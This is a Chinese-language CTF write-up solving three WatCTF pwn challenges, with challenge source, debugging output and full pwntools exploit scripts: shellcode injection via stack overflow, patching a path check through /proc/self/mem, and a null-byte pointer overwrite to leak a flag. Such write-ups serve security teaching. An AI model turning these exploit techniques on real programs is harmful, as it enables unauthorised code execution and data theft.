# watctf_f25_PWN_WP-先知社区

> **来源**: https://xz.aliyun.com/news/18844  
> **文章ID**: 18844

---

### intro2pwn

check：

```
[*] '/home/zlsf/com/watctf/001/pwn'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

source：

```
#include <stdio.h>

void vuln() {
    volatile char buf[55];
    printf("Addr: %p
", buf);
    fflush(stdout);
    scanf("%s", buf);
}

int main() {
    vuln();
}
```

没有栈可执行保护，并且知道栈地址，而且还有足够的写入和栈溢出，我们可以直接写入 shellcode 然后栈溢出劫持程序流来完成 getshell 。

exp:

```
from pwn import *
#from ctypes import *

def stre(a) : return str(a).encode()
def ph(a,b="addr") : print(b+": "+hex(a))
def re(a) : return p.recv(a)
def pre(a) : print(p.recv(a))
def reu(a,b=False) : return p.recvuntil(a,drop=b)
def rel() : return p.recvline()
def se(a) : p.send(a)
def sea(a,b) : p.sendafter(a,b)
def sel(a) : p.sendline(a)
def sela(a,b) : p.sendlineafter(a,b)
def op() : p.interactive()
def cp() : p.close()
def raddr64() : return u64(p.recv(6).ljust(8,b'\x00')) 
def raddr32() : return u32(p.recv(4))
def raddr_T() : return int(re(14),16)
def raddr_A() : return int(reu(b"-",True),16)
def orw_rop64(pop_rdi,pop_rsi,pop_rdx,flag_addr,open_addr,read_addr,write_addr):
    orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(open_addr)
    orw+= p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x30)
    orw+= p64(read_addr)
    orw+= p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x30)
    orw+= p64(write_addr)
    return orw
def getorw(name,buf,Arch) :
    sh=shellcraft.open(name)
    sh+=shellcraft.read(3,buf,0x30)
    sh+=shellcraft.write(1,buf,0x30)
    sh=asm(sh,arch=Arch)
    return sh
def gdbp(p,a='') :
    if a!='':
        gdb.attach(p,a)
        pause()
    else :
        gdb.attach(p)
        pause()

p = remote("challs.watctf.org", 1991)
#p = process("./pwn")
#elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
#lib = cdll.LoadLibrary(None)

#loadsym = "glibc-debug --reload-symbols /home/zlsf/sysset/glibc-all-in-one/libs/2.41-6ubuntu1.1_amd64"
#code_addr = " ./glibc-2.41.tar.gz --force"

#p = process(["qemu-mipsel-static","-g", "9999","-L","./","./pwn"])
#p = process(["qemu-mipsel-static","-L","./","./pwn"])

#context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
#elf.arch , elf.so

reu(b": ")
stack_addr = raddr_T()
ph(stack_addr,"stack_addr")

payload = asm(shellcraft.sh())
payload = payload.ljust(0x58, b"\x00")
payload+= p64(stack_addr)

sela(b"
", payload)

op()
```

### hex-editor-xtended-v2

check:

```
[*] '/home/zlsf/com/watctf/002/pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

source:

```
#include <errno.h>
#include <signal.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <linux/limits.h>

char path[PATH_MAX] = {'\0'};
FILE *current_file = NULL;
// Provide a nicer diagnostic
// if the file was opened in read-only mode.
// (Writing to a read-only file would otherwise error with 'Bad file descriptor'.)
bool file_is_readonly = false; 

void clear_path() {
    path[0] = '\0';
    current_file = NULL;
    file_is_readonly = false;
}

bool startswith(char *str, char *prefix) {
    return strncmp(str, prefix, strlen(prefix)) == 0;
}

void do_open_command(char *user_path) {
    if(realpath(user_path, path) == NULL) {
        perror("could not resolve path");
        clear_path();
        return;
    }
    if (startswith(path, "//")) {
        puts("path has to start with a single slash");
        clear_path();
        return;
    }
    if (strncmp(path, "/secret.txt", strlen("/secret.txt")) == 0) {
        puts("accessing /secret.txt not allowed");
        clear_path();
        return;
    }
    current_file = fopen(path, "r+");
    if(current_file == NULL) {
        if(errno == EACCES) {
            // Let them try opening it for reading anyway
            current_file = fopen(path, "r");
            if(current_file == NULL) {
                perror("Failed opening file for reading");
                clear_path();
                return;
            }
            file_is_readonly = true;
            return;
        }
        perror("Failed opening file");
        clear_path();
        return;
    }
    file_is_readonly = false;
}

char *HELP_TEXT = 
    "Available commands:
"
    "open <path>
"
    "   Open the file located at <path>.
"
    "   e.g. open /readme.txt - open the file located at `/readme.txt`.
"
    "   Note: Due to repeated incidents, I have patched this program
"
    "   to disallow access to `/secret.txt`. THIS PROGRAM WILL NOT LET YOU READ THE SECRETS.
"
    "set <pos> <new_value>
"
    "   Change the value at position <position> of the file into the byte <new_value>.
"
    "   <new_value> should be specified in hexadecimal.
"
    "   e.g. set 192 3a - set position 192 of the file to the byte 0x3a.
"
    "get <pos>
"
    "   Print the byte value at position <pos> as hexadecimal.
"
    "   e.g. get 192 - get the byte at position 192 of the file.
"
    "status
"
    "   Print the current file path, if any.
"
    ;

void do_help() {
    puts(HELP_TEXT);
}

void do_set(uint64_t filepos, char byte) {
    if(current_file == NULL) {
        puts("You're not editing any files currently");
        return;
    }
    if(file_is_readonly) {
        puts("Can't change the contents of a readonly file");
        return;
    }
    if(fseek(current_file, filepos, SEEK_SET) < 0) {
        perror("failed seek");
        return;
    }
    if(fputc(byte, current_file) < 0) {
        perror("failed write");
    }
}

void do_status() {
    if (path[0] == '\0') {
        puts("No files open.");
    } else {
        printf("You are editing %s
", path);
    }
}

void do_get(uint64_t filepos) {
    if(current_file == NULL) {
        puts("You're not editing any files currently");
        return;
    }
    if(fseek(current_file, filepos, SEEK_SET) < 0) {
        perror("failed seek");
        return;
    }
    int ret;
    if((ret = fgetc(current_file)) < 0) {
        if(feof(current_file)) {
            puts("File is too small");
            return;
        }
        perror("failed read");
        return;
    }
    printf("%02x
", ret);
}

int main() {
    puts("Welcome to HEX (HEX Editor Xtended) v8.5 (bugs patched!)");
    puts("Run 'help' for help");

    char *filepath = malloc(256);
    uint64_t filepos = 0;
    unsigned int byte_to_set = 0;

    char *line = NULL;
    size_t line_memlen = 0;
    ssize_t line_readlen = 0;

    while(!feof(stdin)) {
        printf("> ");
        fflush(stdout);

        if((line_readlen = getline(&line, &line_memlen, stdin)) < 0) {
            if(feof(stdin)) break;
            perror("failure reading line");
            continue;
        }

        if(startswith(line, "status")) {
            do_status();
            continue;
        }

        if(startswith(line, "help")) {
            do_help();
            continue;
        }

        if(startswith(line, "open")) {
            if(sscanf(line, "open %255s", filepath) <= 0) {
                printf("invalid command format for `open`
");
                continue;
            }
            do_open_command(filepath);
            continue;
        }

        if(startswith(line, "set")) {
            if(sscanf(line, "set %lu %x", &filepos, &byte_to_set) <= 0) {
                printf("invalid command format for `set`
");
                continue;
            }
            do_set(filepos, (char)byte_to_set);
            continue;
        }

        if(startswith(line, "get")) {
            if(sscanf(line, "get %lu", &filepos) <= 0) {
                printf("invalid command format for `get`
");
                continue;
            }
            do_get(filepos);
            continue;
        }

        printf("unknown command: %s
", line);
    }

    free(line);
}
```

该程序本身并不存在什么漏洞，程序明显提示 /secret.txt 就是 flag。但是 realpath 函数和 strncmp 函数的双组合过滤让我们无法通过 .. 或 / 组合路径绕过检查。( realpath 函数是一个标志库函数用于将 linux 路径化成最简形式)

最有意思的地方才是这里。在 linux 中存在着一个文件 /proc/self/mem 只要任何一个程序使用 fopen 去打开这个路径都是会自动判断打开自己程序的内存文件。

没错，今天我才理解了什么叫 linux 下皆为文件。

并且这种打开方式可以让我们任意读取和修改内存而不受限于 linux 的内存读写执行权限控制。也就是说我们可以读写内存里面的每一个字节包括原本被判断为本不应该读写的内容。

```
.text:0000000000001312 loc_1312:                               ; CODE XREF: do_open_command+60↑j
.text:0000000000001312                 mov     edx, 0Bh        ; n
.text:0000000000001317                 lea     rax, s2         ; "/secret.txt"
.text:000000000000131E                 mov     rsi, rax        ; s2
.text:0000000000001321                 lea     rax, path
.text:0000000000001328                 mov     rdi, rax        ; s1
.text:000000000000132B                 call    _strncmp
```

通过逆向我们可以很容易发现 strncmp(path, "/secret.txt", strlen("/secret.txt")) == 0 这个一语句的第二参数是硬编码在内存中：

```
.rodata:000000000000204E s2              db '/secret.txt',0      ; DATA XREF: do_open_command+85↑o
```

经过其处于只读段但是我们通过 fopen 打开内存文件读写这种姿势完全不受限制，这意味着我们可以修改该硬编码的第一个字节为 '\x00' 这样就绕过了不能读写 /secret.txt 文件的限制。

tips: 写入两次 '\x00' 是因为第一次写入后文件不会马上保存导致 '\x00' 待在缓冲区中，而连续写入两次就能解决这个问题。

exp：

```
from pwn import *
#from ctypes import *

def stre(a) : return str(a).encode()
def ph(a,b="addr") : print(b+": "+hex(a))
def re(a) : return p.recv(a)
def pre(a) : print(p.recv(a))
def reu(a,b=False) : return p.recvuntil(a,drop=b)
def rel() : return p.recvline()
def se(a) : p.send(a)
def sea(a,b) : p.sendafter(a,b)
def sel(a) : p.sendline(a)
def sela(a,b) : p.sendlineafter(a,b)
def op() : p.interactive()
def cp() : p.close()
def raddr64() : return u64(p.recv(6).ljust(8,b'\x00')) 
def raddr32() : return u32(p.recv(4))
def raddr_T() : return int(re(14),16)
def raddr_A() : return int(reu(b"-",True),16)
def orw_rop64(pop_rdi,pop_rsi,pop_rdx,flag_addr,open_addr,read_addr,write_addr):
    orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(open_addr)
    orw+= p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x30)
    orw+= p64(read_addr)
    orw+= p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x30)
    orw+= p64(write_addr)
    return orw
def getorw(name,buf,Arch) :
    sh=shellcraft.open(name)
    sh+=shellcraft.read(3,buf,0x30)
    sh+=shellcraft.write(1,buf,0x30)
    sh=asm(sh,arch=Arch)
    return sh
def gdbp(p,a='') :
    if a!='':
        gdb.attach(p,a)
        pause()
    else :
        gdb.attach(p)
        pause()

#ssh_conn = ssh(host = "challs.watctf.org", user = "hexed", port = 2022, password = "", raw = True)
#p = ssh_conn.run("")
p = process("./pwn")
#elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
#lib = cdll.LoadLibrary(None)

#loadsym = "glibc-debug --reload-symbols /home/zlsf/sysset/glibc-all-in-one/libs/2.41-6ubuntu1.1_amd64"
#code_addr = " ./glibc-2.41.tar.gz --force"

#p = process(["qemu-mipsel-static","-g", "9999","-L","./","./pwn"])
#p = process(["qemu-mipsel-static","-L","./","./pwn"])

#context.log_level = 'debug'
#context.arch = 'amd64'
#context.os = 'linux'
#elf.arch , elf.so

sela(b"> ", b"open /proc/self/mem")
sela(b"> ", b"set " + stre(0x49704E) + b" " + hex(0x0).encode())
sela(b"> ", b"set " + stre(0x49704E) + b" " + hex(0x0).encode())
sela(b"> ", b"open /secret.txt")
for i in range(50):
    sela(b"> ", b"get " + stre(i))
    print(chr(int(re(2),16)), end = "")

p.interactive()
```

### person-tracker

check:

```
[*] '/home/zlsf/com/watctf/003/pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

source:

```
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

#ifdef FLAGVAR
// In the server-side binary, `FLAGVAR` is set to the flag
const volatile char * const FLAG = FLAGVAR;
#else
const volatile char * const FLAG = "fakectf{not the real flag}";
#endif

typedef struct Person {
    uint64_t age;
    char name[24];
    struct Person *next;
} Person;

Person *root = NULL;

uint64_t person_count = 0;

Person *person_at_index(int idx) {
    Person *res = root;
    while (idx > 0) {
        res = res->next;
        idx--;
    }
    return res;
}

int main() {
    puts("Welcome to the Person Tracker!");
    while(1) {
        puts("MENU CHOICES:");
        puts("1. Add a new person");
        puts("2. View a person's information");
        puts("3. Update a person's information");
        printf("Enter your choice: ");
        fflush(stdout);
        int choice;
        if (scanf("%d", &choice) != 1) {
            printf("Invalid input. Please enter a number.
");
            while (getchar() != '
'); 
            continue;
        }
        getchar();
        if (choice == 1) {
            Person *new = malloc(sizeof(Person));
            new->next = root;
            root = new;
            person_count++;
            printf("Enter their age: ");
            fflush(stdout);
            scanf("%lu", &new->age);
            getchar();
            printf("Enter their name: ");
            fflush(stdout);
            fgets(new->name, sizeof(new->name) + 1, stdin); // +1 for null byte
            puts("New person prepended!");
        } else if (choice == 2) {
            printf("Specify the index of the person: ");
            fflush(stdout);
            int idx;
            scanf("%d", &idx);
            getchar();
            if (idx < 0 || idx >= person_count) {
                puts("Invalid index!");
                continue;
            }
            Person *p = person_at_index(idx);
            puts("What information do you want to view?");
            puts("1. Their age");
            puts("2. Their name");
            printf("Enter choice: ");
            fflush(stdout);
            int choice2;
            scanf("%d", &choice2);
            getchar();
            if (choice2 == 1) {
                printf("Their age is %lu
", p->age);
            } else if (choice2 == 2) {
                printf("Their name is %s
", p->name);
            }
        } else if (choice == 3) {
            printf("Specify the index of the person: ");
            fflush(stdout);
            int idx;
            scanf("%d", &idx);
            getchar();
            if (idx < 0 || idx >= person_count) {
                puts("Invalid index!");
                continue;
            }
            Person *p = person_at_index(idx);
            puts("What information do you want to modify?");
            puts("1. Their age");
            puts("2. Their name");
            printf("Enter choice: ");
            fflush(stdout);
            int choice2;
            scanf("%d", &choice2);
            getchar();
            if (choice2 == 1) {
                printf("Enter their age: ");
                fflush(stdout);
                scanf("%lu", &p->age);
                getchar();
            } else if (choice2 == 2) {
                printf("Enter the new name: ");
                fflush(stdout);
                fgets(p->name, sizeof(p->name) + 1, stdin); // +1 for null byte
            }
            puts("Updated successfully!");
        }
    }
}
```

ida:

```
.rodata:000000000049B21E aFakectfNotTheR db 'fakectf{not the real flag}',0
```

根据源代码和逆向可知 flag 将会被加载到地址 0x49B21E 处。

很明显，代码中的注释表明我有 null by one 漏洞。

程序依靠 Person 结构体中的 struct Person \*next 来索引下一个 Person 结构体，而新创建的结构体总是在头上。

通过调试我们发现：

```
0x2e169c70	0x0000000000000000	0x0000000000000031	........1.......
0x2e169c80	0x000000000000000a	0x4141414141414141	........AAAAAAAA
0x2e169c90	0x000000000000000a	0x0000000000000000	................
0x2e169ca0	0x0000000000000000	0x0000000000000031	........1.......
0x2e169cb0	0x000000000000000a	0x4141414141414141	........AAAAAAAA
0x2e169cc0	0x000000000000000a	0x0000000000000000	................
0x2e169cd0	0x000000002e169c80	0x0000000000000031	........1.......
0x2e169ce0	0x000000000000000a	0x4141414141414141	........AAAAAAAA
0x2e169cf0	0x000000000000000a	0x0000000000000000	................
0x2e169d00	0x000000002e169cb0	0x0000000000000031	........1.......
0x2e169d10	0x000000000000000a	0x4141414141414141	........AAAAAAAA
0x2e169d20	0x000000000000000a	0x0000000000000000	................
0x2e169d30	0x000000002e169ce0	0x0000000000000031	........1.......
0x2e169d40	0x000000000000000a	0x4141414141414141	........AAAAAAAA
0x2e169d50	0x000000000000000a	0x0000000000000000	................
0x2e169d60	0x000000002e169d10	0x0000000000000031	........1.......
0x2e169d70	0x000000000000000a	0x4141414141414141	........AAAAAAAA
0x2e169d80	0x000000000000000a	0x0000000000000000	................
0x2e169d90	0x000000002e169d40	0x000000000001f271	@.......q.......	 <-- Top chunk
pwndbg> 
```

我们可以发现地址 0x2e169d90 为 struct Person \*next 指向的是 0x2e169d40，我们可以用 null by one 修改 0x2e169d90 地址处的 0x2e169d40 为 0x2e169d00 。

此时 0x2e169d00 + 0x20 处正好是 0x2e169d10 所在的 Person 结构体可编辑的位置，我们可以修改这里的地址为 0x49B21E - 0x8 的位置，从而通过 2 号 Person 结构体查看其 name 来将 flag 打印出来。

tips: 远程与本地所使用的 libc 略有不同，所以堆块的数量要做微调才能打通。

exp:

```
from pwn import *
#from ctypes import *

def stre(a) : return str(a).encode()
def ph(a,b="addr") : print(b+": "+hex(a))
def re(a) : return p.recv(a)
def pre(a) : print(p.recv(a))
def reu(a,b=False) : return p.recvuntil(a,drop=b)
def rel() : return p.recvline()
def se(a) : p.send(a)
def sea(a,b) : p.sendafter(a,b)
def sel(a) : p.sendline(a)
def sela(a,b) : p.sendlineafter(a,b)
def op() : p.interactive()
def cp() : p.close()
def raddr64() : return u64(p.recv(6).ljust(8,b'\x00')) 
def raddr32() : return u32(p.recv(4))
def raddr_T() : return int(re(14),16)
def raddr_A() : return int(reu(b"-",True),16)
def orw_rop64(pop_rdi,pop_rsi,pop_rdx,flag_addr,open_addr,read_addr,write_addr):
    orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(open_addr)
    orw+= p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x30)
    orw+= p64(read_addr)
    orw+= p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x30)
    orw+= p64(write_addr)
    return orw
def getorw(name,buf,Arch) :
    sh=shellcraft.open(name)
    sh+=shellcraft.read(3,buf,0x30)
    sh+=shellcraft.write(1,buf,0x30)
    sh=asm(sh,arch=Arch)
    return sh
def gdbp(p,a='') :
    if a!='':
        gdb.attach(p,a)
        pause()
    else :
        gdb.attach(p)
        pause()

p = remote("challs.watctf.org", 5151)
#p = process("./pwn")
#elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
#lib = cdll.LoadLibrary(None)

#loadsym = "glibc-debug --reload-symbols /home/zlsf/sysset/glibc-all-in-one/libs/2.41-6ubuntu1.1_amd64"
#code_addr = " ./glibc-2.41.tar.gz --force"

#p = process(["qemu-mipsel-static","-g", "9999","-L","./","./pwn"])
#p = process(["qemu-mipsel-static","-L","./","./pwn"])

#context.log_level = 'debug'
#context.arch = 'amd64'
#context.os = 'linux'
#elf.arch , elf.so

def add(age, name):
    sela(b": ", stre(1))
    sela(b": ", stre(age))
    sela(b": ", name)

def show(index, choice):
    sela(b": ", stre(2))
    sela(b": ", stre(index))
    sela(b": ", stre(choice))

def edit(index, choice, an):
    sela(b": ", stre(3))
    sela(b": ", stre(index))
    sela(b": ", stre(choice))
    if choice == 1:
        sela(b": ", stre(an))
    else:
        sela(b": ", an)

for i in range(4):
    add(10, b"A"*8)

add(10, b"A"*0x8 + p64(0x49B21E-0x8))
add(10, b"Z"*24)

show(2, 2)

op()
```
